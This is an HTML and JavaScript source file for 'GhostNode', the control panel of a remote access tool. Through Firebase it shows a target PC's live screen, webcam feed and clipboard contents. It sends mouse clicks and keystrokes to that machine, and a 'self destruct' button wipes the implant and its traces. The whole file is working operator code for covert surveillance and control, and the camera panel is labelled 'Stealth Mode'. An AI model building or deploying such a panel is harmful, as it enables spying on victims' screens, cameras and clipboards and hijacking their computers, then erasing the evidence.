<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost Control Panel - RealTime</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
        #remote-cursor { position: absolute; pointer-events: none; width: 14px; height: 14px; background: #ef4444; border: 2px solid white; border-radius: 50%; box-shadow: 0 0 10px rgba(239, 68, 68, 0.8); z-index: 50; transition: all 0.1s ease-out; }
        .motion-alert { animation: pulse-red 1.5s infinite; }
        @keyframes pulse-red { 
            0%, 100% { border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.1); } 
            50% { border-color: rgba(239, 68, 68, 1); background: rgba(239, 68, 68, 0.3); } 
        }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
    </style>
</head>
<body class="bg-[#020617] text-slate-200 min-h-screen font-sans overflow-x-hidden">

    <!-- Navbar -->
    <nav class="p-4 border-b border-slate-800 glass sticky top-0 z-[100] flex justify-between items-center">
        <div class="flex items-center gap-3">
            <div id="status-indicator" class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
            <h1 class="font-black tracking-tighter text-2xl italic text-white uppercase">GHOST<span class="text-blue-500 font-light">NODE</span></h1>
        </div>
        <div class="flex gap-3">
            <button onclick="sendCommand('reset_camera')" class="bg-blue-600/20 text-blue-400 border border-blue-500/50 hover:bg-blue-600 hover:text-white px-4 py-2 rounded-lg text-xs font-black transition-all">RESTART CAMERA</button>
            <button onclick="confirmSelfDestruct()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-xs font-black transition-all shadow-lg shadow-red-900/20">SELF DESTRUCT</button>
        </div>
    </nav>

    <main class="p-6 grid grid-cols-12 gap-6">
        
        <!-- Left Section: Screen View -->
        <div class="col-span-12 lg:col-span-8 space-y-4">
            <div class="glass p-2 rounded-2xl overflow-hidden relative group" id="screen-container" onclick="handleScreenClick(event)">
                <div id="remote-cursor"></div>
                <img id="live-screen" src="" class="w-full h-auto rounded-xl bg-slate-900 min-h-[400px] object-contain" alt="Waiting for screen signal...">
                <div class="absolute top-6 left-6 flex items-center gap-2 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10 shadow-xl">
                    <span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
                    <span class="text-[10px] font-mono font-bold tracking-widest uppercase">Live View</span>
                </div>
            </div>

            <!-- Interaction Bar -->
            <div class="glass p-4 rounded-2xl flex gap-3 shadow-2xl">
                <input id="key-input" type="text" placeholder="Type something to send as keystrokes..." class="bg-slate-950/50 border border-slate-700/50 px-5 py-3 rounded-xl flex-1 focus:outline-none focus:border-blue-500/50 text-sm transition-all font-mono">
                <button onclick="sendText()" class="bg-white text-black px-8 py-3 rounded-xl font-black hover:bg-blue-50 transition-all text-sm uppercase tracking-tighter">Press Enter</button>
            </div>
        </div>

        <!-- Right Section: Camera & Data -->
        <div class="col-span-12 lg:col-span-4 space-y-6">
            
            <!-- Camera Module -->
            <div id="cam-box" class="glass p-3 rounded-2xl aspect-video relative flex items-center justify-center bg-black/40 border-2 border-transparent transition-all overflow-hidden">
                <img id="live-camera" src="" class="w-full h-full object-cover rounded-xl hidden">
                <div id="cam-placeholder" class="text-center space-y-3">
                    <div class="w-16 h-16 bg-slate-800/50 rounded-full flex items-center justify-center mx-auto border border-slate-700">
                        <svg class="w-8 h-8 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                    </div>
                    <p id="cam-status-msg" class="text-[10px] font-mono font-bold text-slate-500 uppercase tracking-widest">Camera Standby</p>
                </div>
                <div class="absolute top-4 right-4 bg-black/80 backdrop-blur-md border border-white/10 px-3 py-1 rounded-lg flex items-center gap-2">
                    <span id="cam-dot" class="w-1.5 h-1.5 bg-slate-500 rounded-full"></span>
                    <span id="cam-txt" class="text-[9px] font-black uppercase">Offline</span>
                </div>
            </div>

            <!-- Clipboard/Log History -->
            <div class="glass p-5 rounded-2xl flex-1 flex flex-col gap-4 min-h-[300px]">
                <div class="flex justify-between items-center border-b border-slate-800/50 pb-3">
                    <h3 class="text-xs font-black text-blue-500 uppercase tracking-widest">Clipboard Logs</h3>
                    <span class="text-[9px] bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded border border-blue-500/20 font-bold uppercase">Real-time</span>
                </div>
                <div id="clipboard-list" class="flex flex-col gap-2.5 overflow-y-auto max-h-[400px] pr-2">
                    <!-- Logs injection here -->
                </div>
            </div>

        </div>
    </main>

    <!-- Overlay Alert for Self Destruct -->
    <div id="destruct-modal" class="fixed inset-0 bg-black/90 backdrop-blur-xl z-[200] hidden items-center justify-center p-6 text-center">
        <div class="max-w-md space-y-6">
            <div class="w-24 h-24 bg-red-600/20 rounded-full flex items-center justify-center mx-auto border-2 border-red-600 animate-pulse">
                <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
            </div>
            <h2 class="text-3xl font-black italic uppercase">System Purge Initiated</h2>
            <p class="text-slate-400 text-sm leading-relaxed font-mono">All files, startup entries, and traces are being wiped from the target machine. The connection will close permanently.</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        // ERROR FIX: Check if __firebase_config exists, else use a default check or null
        let firebaseConfig;
        try {
            firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
        } catch (e) {
            console.error("Firebase config missing or invalid.");
            firebaseConfig = {}; 
        }

        const appId = typeof __app_id !== 'undefined' ? __app_id : 'sainfoxiya-com-a7733';

        // Only initialize if config is valid
        if (firebaseConfig.apiKey) {
            const app = initializeApp(firebaseConfig);
            const db = getFirestore(app);
            const auth = getAuth(app);
            let user = null;

            // --- AUTH ---
            async function init() {
                try {
                    const res = await signInAnonymously(auth);
                    user = res.user;
                    setupListeners(db, auth);
                } catch (err) {
                    console.error("Auth Error:", err);
                }
            }
            init();

            function setupListeners(db, auth) {
                // 1. Screen Monitor
                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
                    if(snap.exists()) {
                        const data = snap.data();
                        const screenImg = document.getElementById('live-screen');
                        const cursor = document.getElementById('remote-cursor');
                        
                        if(data.frame) screenImg.src = data.frame;
                        cursor.style.left = (data.cursorX * 100) + '%';
                        cursor.style.top = (data.cursorY * 100) + '%';
                    }
                });

                // 2. Camera Monitor
                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
                    if(snap.exists()) {
                        const data = snap.data();
                        const camImg = document.getElementById('live-camera');
                        const placeholder = document.getElementById('cam-placeholder');
                        const box = document.getElementById('cam-box');
                        const dot = document.getElementById('cam-dot');
                        const txt = document.getElementById('cam-txt');
                        const msg = document.getElementById('cam-status-msg');

                        if(data.frame && !data.motion) {
                            camImg.src = data.frame;
                            camImg.classList.remove('hidden');
                            placeholder.classList.add('hidden');
                            dot.className = "w-1.5 h-1.5 bg-green-500 rounded-full";
                            txt.innerText = "Live";
                            box.classList.remove('motion-alert');
                        } else {
                            camImg.classList.add('hidden');
                            placeholder.classList.remove('hidden');
                            dot.className = "w-1.5 h-1.5 bg-red-600 rounded-full";
                            txt.innerText = data.motion ? "Motion" : "Off";
                            msg.innerText = data.motion ? "Stealth Mode: Motion Detected" : "Waiting for Permission";
                            if(data.motion) box.classList.add('motion-alert');
                            else box.classList.remove('motion-alert');
                        }
                    }
                });

                // 3. Clipboard Feed
                const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(12));
                onSnapshot(q, (snap) => {
                    const container = document.getElementById('clipboard-list');
                    container.innerHTML = '';
                    snap.forEach(doc => {
                        const log = document.createElement('div');
                        log.className = "bg-slate-900/80 p-3 rounded-xl border border-white/5 text-[11px] font-mono break-all hover:border-blue-500/30 transition-all";
                        log.innerText = doc.data().text;
                        container.appendChild(log);
                    });
                });

                // Expose sendCommand to window
                window.sendCommand = async (type, extra = {}) => {
                    if(!auth.currentUser) return;
                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
                        type, ...extra, timestamp: serverTimestamp()
                    });
                };
            }
        } else {
            console.warn("GhostNode: Firebase configuration not found. Use real deployment for live connection.");
        }

        window.sendText = () => {
            const el = document.getElementById('key-input');
            if(el.value.trim() && window.sendCommand) {
                sendCommand('text', { value: el.value });
                el.value = '';
            }
        };

        window.handleScreenClick = (e) => {
            const rect = e.target.getBoundingClientRect();
            const relX = (e.clientX - rect.left) / rect.width;
            const relY = (e.clientY - rect.top) / rect.height;
            if (window.sendCommand) sendCommand('click', { relX, relY });
        };

        window.confirmSelfDestruct = () => {
            const modal = document.getElementById('destruct-modal');
            if(confirm("DANGER: This will delete the executable and all startup files on the remote PC. Connection will be lost forever. Proceed?")) {
                if (window.sendCommand) {
                    sendCommand('self_destruct');
                    modal.classList.remove('hidden');
                    modal.classList.add('flex');
                }
            }
        };

    </script>
</body>
</html>
